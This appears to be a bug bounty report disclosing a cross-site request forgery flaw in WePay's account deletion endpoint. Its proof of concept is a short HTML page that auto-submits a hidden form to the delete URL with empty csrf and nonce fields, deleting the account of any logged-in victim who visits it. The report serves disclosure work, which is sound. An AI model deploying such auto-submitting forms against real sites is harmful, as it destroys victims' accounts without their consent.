Summary:

I have found that delete action is vulnerable to CSRF and could lead to the principal account to be deleted once the victim visit the attacker's fake page.

Proof Of Concept : (WARNING: I am submitting the form using JS, so only by accessing a page with the code below will lead to account deletion)
-----------------------------------------------------------------
<html>
<form method="post" name="formsubmit" action="https://www.wepay.com/settings/delete" >
		<input type="hidden" name="csrf" value="" />
		<input type="hidden" name="nonce" value="" />	
<script type="text/javascript" language="JavaScript">
//submit form
document.formsubmit.submit();
</script>
</form>
</html>
